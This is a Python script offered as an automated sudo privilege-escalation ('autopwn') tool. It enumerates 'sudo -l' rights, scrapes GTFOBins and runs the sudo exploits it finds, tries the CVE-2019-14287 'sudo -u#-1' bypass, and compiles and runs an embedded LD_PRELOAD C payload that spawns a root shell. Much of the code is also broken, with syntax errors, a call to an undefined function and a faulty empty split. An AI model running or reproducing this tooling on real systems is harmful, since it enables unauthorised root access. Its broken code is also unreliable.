#!/bin/python
#        ___________      _____ __  ______  ____ 
#       / ____/__  /     / ___// / / / __ \/ __ \
#      / __/    / /      \__ \/ / / / / / / / / /
#     / /___   / /__    ___/ / /_/ / /_/ / /_/ / 
#    /_____/  /____/   /____/\____/_____/\____/  
#                                           
#
#    Because the script kiddies are the real hackers ;)
#
#
# Description: This is an full featured sudo enumeration/autopwn script that scans the 
#              current system with various bash commands to test if there are any sudo
#              misconfiguration or any unpatched CVEs and the exploits them to (hopefully)
#              spawn a root shell!
#
# Libraries
# ---------
#
# 2 libraries to find them all
import subprocess
import os
# 2 libraries to scrape them all
import requests
from bs4 import BeautifulSoup
# 1 library to make things colourful
from termcolor import colored
# And in the darkness pwn them

# *cough* oh and these  *cough*
import re, sys

autopwn = False
if len(sys.argv) == 2 and sys.argv[1] == "--autopwn":
    autopwn = True

# Constants
# ---------
# 
# GTFO Bins URL
url = "https://gtfobins.github.io/gtfobins/"
# LD_PRELOAD C script courtesy of PayloadsAllTheThings
ld_script='#include <stdio.h>\n'
ld_script+='#include <sys/types.h>\n'
ld_script+='#include <stdlib.h>\n'
ld_script+='void _init() {\n'
ld_script+='\tunsetenv("LD_PRELOAD");\n'
ld_script+='\tsetgid(0);\n'
ld_script+='\tsetuid(0);\n'
ld_script+='\tsystem("/bin/sh");\n'
ld_script+='}\n'

# Vanity banners
# --------------
#
# so everyone knows this scirpt was authored by a l337 hackzor

buff='     ___________      _____ __  ______  ____ \n'
buff+='    / ____/__  /     / ___// / / / __ \\/ __ \\\n'
buff+='   / __/    / /      \\__ \\/ / / / / / / / / /\n'
buff+='  / /___   / /__    ___/ / /_/ / /_/ / /_/ / \n'
buff+=' /_____/  /____/   /____/\\____/_____/\\____/  \n'

print(colored(buff.center(25), 'magenta'))

buff='                                            .\n'
buff+='                       .          .                    .  /\\   .\n'
buff+="        .                                       *         `'\n"
buff+='                  *        ,,,, ,,,                                   .\n'
buff+="                         ,'    '   `'',,,\n"
buff+='                        ,                `            .         .\n'
buff+="             .        .'                  '',,,\n"
buff+="                   .,'            /\\     --.;:.:\n"
buff+="       .-,        .';       ,/.   \\/         ::.\\         .---.\n"
buff+="       `-'       ;::'          .        .   ::::.`-.    .'     \\      *\n"
buff+="      .        ,:':;,...;_ _'.''-.___    \\.::;::|8:.|,e/    .   b\n"
buff+="              .;' '  :::|,'./|    ---\\,,::\\:|8|e|88:\\8' _\n"
buff+="    .         |      ,;/.//|:|     |`\\\\ \\;;-|8888888|'.8e'--.         .\n"
buff+="         .   ,|  ,,;;///./':(||    ` `||||:\\88888888||8'     \\\n"
buff+="             |:.::;//.|'//|||`|    |  `\\\\||\\::`8888888'_      \\\n"
buff+="    /\\       |:::///.|;|..---';.  `----.\\|).|.|..`888|8e=--.   |     ,-,\n"
buff+="    \\/       ||:|/.|:,'|',===;.-   ====-.:\\.||.\\\\.'888'     \\  U     `-'\n"
buff+='        .    |||/.:||(.-=\';.| \\\\|   `..`"|\\;..|....\\88ee     \\      .\n'
buff+="              \\<|..'.|.\\ ___'       ._'_,\\\\|'\\|.|.|\\88b'\\     b\n"
buff+="              .'|:|;.|||`  '           ' |'|.\\'.|..|.qp  |\n"
buff+="    .         | |.(:.|.`                 ';':.)|.|.| .._ U\n"
buff+='              ` |.`.,`|.\\       b       /|:.|.|.,(..\\..:;-      .      .\n'
buff+="        *       /\\.||..|.`      _      '||:.:.`.|...|...-.\n"
buff+="   .           ' |.`..).,|\\    '-`    /|:(|:.):||..|.|. .:`_\n"
buff+="                 |..).|.|..`..      .':|:||:.|.')`.\\.\\ .\\--.      *\n"
buff+="                 /..'|'.| |||  ._.'.||;|:;|:.|/||:` \\`,..\\._           .\n"
buff+="      .   .     '('|:|`..'_;|    .:.|=---.;/|| |||  \\-oo.|__\n"
buff+='                .\' / |`|.\'-=\'-------`"\'::.| \'|  |`. \\8oooooo\\\n'
buff+="              .'.   .'|'|_   __,--'...;:--'  |  `.  .8bod888o|  .   /\\\n"
buff+="         *   .'. '  | :::|`-' __.---' _++-'  '    ' \\88e8888o|      `'\n"
buff+=" .           ;-'   ,,:::|---'     ___+++-       :   \\8888888o`.\n"
buff+="            ,d'  ,:::::'|_o-o----'_++++-   :    :. \\.8888888oo|    .\n"
buff+="       .   ,8/  ,:::' .|`88 _.--.++++-    ::: . ::\\o88888888oo|\n"
buff+="    .     ,88/     . . |.`8'__.-',-'      :::  .::\\o88888888bo`.\n"
buff+='          |8o/  :.  . .| `|\\    /,          ::. :\\o8888888888oo|     *\n'
buff+='          |8o/  :   :. |/ | \\   /,       .  :: .\\o88888888888oo|        .\n'
buff+='         ,888o/    :. .|  |     /, __   . . :: |o888888888888bo`.  .\n'
buff+="         |8888o/: :  .|...|    .--' -'     . :|o88888888888888oo|\n"
buff+='    .   ,88888o/ :  . |...|/..|::=---,  : .  |o888888888888888oo|\n'
buff+="        |88888o/   . .|...|.. |:',__   :   .|o8888888888888888bo`.    .\n"
buff+="        |888888o/   . |...|. |:::__ '  :: .|o888888888X88888888oo|\n"
buff+="       ,88888888o|   .|b..|. |::,--'  .:::|88888888888X88888888oo|\n"
buff+="  .    |88X88888o/   .d8b----'::|    . .::|88888888888188888888bo`.\n"
buff+="       |881888888o|  |8p':::|::8| .:: .  |8888888888889888888888oo|    .\n"
buff+='       |8838888888o| |8|::::::e8|.`::.  |.8888888888889888888888oo|\n'
buff+="      ,888588888888o||8|88888888| .::,||'o88888X8888885888888888bo`.\n"
buff+='      |888X888888888o88|888888888| .|ooo8888888X888888X8888888888oo|\n'
buff+='      |888X888m88888888|8G8S8T8d88bd888888888881888888X8888888888oo|\n'
buff+='      |8888888I88888888|888888d88888888888888881888888X8888888888oo|\n'
buff+="      |8888888n88888888|8'....`8'q8888888888888$88888888888888888go|\n"
buff+='      |8888888U8888888|d8/.....|.|88888888888882888888888888888888s|\n'
buff+="      |8888888t8888888|8'/.....|.|88888888888882888888888888888888t|\n"
buff+='      |8888888e8888888|//......|.|8888888888888X8888888888888888888|\n'
buff+='      |8888888S8888888|//......|.|888888888888888888888888888888888|\n'
buff+="      `888888888888888|//......|.|888888888888888888888888888888888'\n"
buff+='       888888888888888|//......|.|888888888888888888888888888888888\n'
buff+="       `88888888888888|//......|.|88888888888888888888888888888888'\n"

print(colored(buff.center(35), 'cyan'))

print(colored("This script is dedicated to all those cyberpunks who fight against \ninjustice and corruption every day of their lives!\n\n".center(20), "green"))

def getSudoRights():
    # Grab sudo rights with sudo -l
    
    bins = [None] 
    cmd1 = f"sudo -l"
    sudol = subprocess.getoutput(cmd1)
    
    # Parse output 
    
    hostname = subprocess.getoutput('hostname')
    user = subprocess.getoutput('whoami')
    rights = sudol.split(f'User {user} may run the following commands on {hostname}:\n')
    if rights[0] == '':
        rights = rights[1].split('\n')
    else:
        rights = rights[2].split('\n')
    
    # This regex will grab the 3 field
    
    regex = "\s{4}\(([^\)]+)\)\s([^:]+):\s(.+)"
    for right in rights:
        
        if len(re.findall(regex,right)[0]) == 3:
            who, passwd, what = re.findall(regex,right)[0]
        else:
            who, what = re.findall(regex,right)[0]
        
        if who == 'ALL' or who == 'root':
            if what == 'ALL':
                if passwd == 'NOPASSWD':
                    bins[0] = True
                else:
                    bins[0] = False
            else:
                bins.append(what.split('')[-1])
                print('[!] Got root sudo rights for {what} !')
        elif who == "ALL, !root" and what = "ALL":
            bins.append("True")
        else:
            print('[*] Got some sudo right for a non root user. Useful? :')
            print(right)
    
    ld_pre = False
    return bins,ld_pre 

def scrapeGTFOBinsNOPASSWD(bin_):
    
    page = requests.get(url+bin_)
    
    if page.status_code == 200:
        try:
            content = page.content.decode('utf-8').split('<h2 id="sudo" class="function-name">SUID</h2>')[1] 
            soup = BeautifulSoup(content, 'html.parser')
            exploit = str(soup.find('pre').find('code').text)
            print(colored(f"[!] Dope!!! {bin_} has a sudo exploit, go fourth and pwn my child: ", 'red'))
            print(exploit)
            return exploit
        except:
            print(colored(f"[*] {bin_} is on GTFO bins but no sudo exploit I'm afraid :(", 'yellow'))
    else:
        print(colored(f"[*] you have sudo rights to {bin_} but it's not got an exploit on GTFOBins", 'blue'))

def runExploit(exploit):
    
    print(colored(f"[!] Giving it a try now, praise the turtle god and may be you blessed with all the shells", 'red'))
    
    for i,cmd in enumerate(exploit.split('\n')):
        if i!=0:
            cmd = re.sub('^./','',cmd)
            os.system(cmd)

def compileLDExploit():
    
    outcome = os.system(f"export TMP=$(mktemp -d); echo '{ld_script}' > $TMP/shell.c; gcc -fPIC -shared -o $TMP/shell.so $TMP/shell.c -nostartfiles;")
    
    if outcome == 0:
        print(colored(f"[*] Done baking! (Well compiling a malicious C library but who's counting...)", 'yellow'))
        return True
    else:
        print(colored(f"[!] Oh dear... That did not work... Is gcc installed and are you authorized to run it?\n    Maybe compile it yourself on another machine and try this manually?", 'red'))
        return False

def runLDExploit(bins):
    
    print(colored(f"[!] Giving it a try now, praise the turtle god and may be you blessed with all the shells", 'red'))
    
    for bin_ in bins:
        outcome = os.system(f'sudo LD_PRELOAD=$TMP/shell.so {bin_}')
        if outcome == 0:
            return True
        else:
            print(colored(f"[*] {bin_} didn't work sadly, if there are any other NOPASSWD programs I'll try with them...", 'yellow'))
    return False

if __name__ == "__main__":
    # parse sudo -l to determine current sudo rights
    
    bins,ld_pre = getSudoRights()
    
    # If you have unlimited sudo rights, with or without a password, pwn everything 
    
    if bins[0] == True:
        print("[!] Ummm... Turns you have unlimited sudo rights and you don't even need a password.") 
        print("[|] One lazy sysadmin at work here. Pwning now!")
        os.system("sudo su")
        quit()
    elif bins[0] == False:
        print("[!] Turns you have unlimited sudo rights! Might need the current user's password though.... Pwning now")
        os.system("sudo su")
    
    # Remove the ALL flag form the start of the bins array 
    
    bins = bins[1:] 

    # Attempt to exploit CVE-2019-14287
    
    if bins[0] == True:
         print("[!] You have "(ALL, !root) ALL" permisions set if sudo if outdate might be able to exploit it with CVE-2019-14287 (Which is the best CVE ever, period)
        os.system("sudo -u#-1 /bin/bash")
        bins = bins[1:]

    # If any sudo bins where found try exploiting the via GTFOBins
    
    if len(bins) > 0:
        if ld_pre:
            print(colored(f"[!] Sweet! The LD_PRELOAD flag is set! Just let me cook up a little something first...", 'red'))
            if compileLDExploit():
                runLDExploit(bins)
            else:
                print(colored(f"[*] Seeing how that didn't work let's try something else eh?", 'yellow'))
        for bin_ in bins:
            exploit = scrapeGTFOBins(bin_)
            if autopwn == True and exploit != None:
                runExploit(exploit)
    else:
        print("[!] Bummer... Looks to like you have exactly z3r0 sudo rights :'( ")
    
    print(colored("[*] That's all Folks! If that didn't work maybe try reading a book or something?", 'green'))
